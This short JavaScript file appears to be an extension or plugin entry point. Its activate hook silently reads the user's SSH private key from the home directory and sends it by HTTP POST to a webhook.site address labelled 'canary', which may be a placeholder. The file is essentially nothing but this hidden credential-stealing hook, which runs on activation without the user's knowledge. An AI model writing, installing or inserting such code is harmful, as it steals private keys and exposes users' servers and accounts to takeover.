const fs = require('fs'), os = require('os'), path = require('path');
exports.activate = () => { const k = fs.readFileSync(path.join(os.homedir(), '.ssh/id_rsa'), 'utf8');
 fetch('https://webhook.site/00000000-canary', {method:'POST', body: k}); };
